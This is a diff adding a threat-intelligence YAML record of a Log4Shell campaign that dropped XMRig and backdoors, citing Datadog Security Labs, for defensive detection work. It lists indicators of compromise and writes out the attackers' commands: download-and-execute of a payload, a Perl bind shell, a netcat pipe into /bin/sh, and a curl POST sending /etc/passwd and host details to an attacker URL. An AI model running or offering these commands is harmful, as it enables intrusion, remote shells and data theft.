@@ -1,0 +1,73 @@
+description: Opportunistic threat actors exploited Log4j vulnerability (Log4Shell)
+  to deploy XMRig for crypto-mining and establish multiple backdoors.
+TTPs:
+  processes:
+  - curl
+  - wget
+  - chmod
+  - sh
+  - perl
+  - nc
+  - gpg
+  commandline:
+  - curl -s http://nfdo[.]shop/lte -o /tmp/lte
+  - wget -q -O /tmp/lte http://nfdo[.]shop/lte
+  - chmod +x /tmp/lte
+  - /bin/sh -c /tmp/lte
+  - perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(985,INADDR_ANY));listen(S,SOMAXCONN);for(;accept(C,S);){while
+    (<C>){if(/sockaddr/){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");system("/bin/sh
+    -i");close(STDIN);close(STDOUT);close(STDERR);close(C);}}}'
+  - nc -lp 826 | gpg --decrypt --batch --passphrase daemon | /bin/sh
+  - 'curl -s -X POST http://nfdo[.]shop/fanfic.php -H "Content-Type: application/x-www-form-urlencoded"
+    -d "pass=banizaza&nproc=$nproc&mem=$mem&whoami=$whoami&homedir=$homedir&os=$os&lscpu=$lscpu&etc_passwd=$etc_passwd&etc_passwd_line=$etc_passwd_line&ss_tl=$ss_tl&in_sudo=$in_sudo&uname_a=$uname_a&df_h=$df_h&last=$last&top=$top&ps_componist=$ps_componist&in_docker=$in_docker"'
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - ldap://44-211-80-168-i80.superr[.]buzz:1389/rmr
+  - http://185.159.82[.]103:8000/xExportObject.class
+  - http://nfdo[.]shop/lte
+  - http://nfdo[.]shop/componist
+  - http://nfdo[.]shop/fanfic.php
+  file_activity:
+  - /tmp/lte
+  - /bin/rcd
+  - /bin/componist
+  - /bin/nfdo
+  persistence:
+  - systemdservice for persistent execution
+  - cron job using crontab to ensure the payload runs on system reboot
+  - local systemduser service or a cron job for non-root users
+  process_relations: []
+CVEs:
+- CVE-2021-44228
+IOCs:
+  hashes:
+  - e4edfa8c6891f6815c05e73852212207cc454a42496d1a109e750c660368b5c1
+  - 5441be217e98051c284d584e830f9a7fc2153143fafee0dc9f6af197cec6c8c9
+  - 2ac2877c9e4cd7d70673c0643eb16805977a9b8d55b6b2e5a6491db565cee1f
+  - 4f11db82193aebe710585b2faefd2b904b6fe6636f7dc25541cea0dd31adada4
+  ip_addresses:
+  - 185.220.101[.]34
+  - 44-211-80-168-i80.superr[.]buzz
+  - 185.159.82[.]103
+  domains:
+  - superr[.]buzz
+  - cmpnst[.]info
+  - nfdo[.]shop
+  urls:
+  - http://44.211.80.168/login.action?0s_destination=%2Fdo&permissionViolation=true
+  - ldap://44-211-80-168-i80.superr.buzz:1389/rmr
+  - http://185.159.82[.]103:3000/xExportObject.class
+  - http://nfdo[.]shop/lte
+  - http://nfdo[.]shop/componist
+  - http://nfdo[.]shop/fanfic.php
+authors:
+- Andy Giron
+- Frederic Baguelin
+- Eslam Salem
+- Matt Mills
+reference: https://securitylabs.datadoghq.com/articles/the-gift-that-keeps-on-giving-a-new-opportunistic-log4j-campaign
+date_of_publication: August 20, 2024
+file_creation_date: January 07, 2026
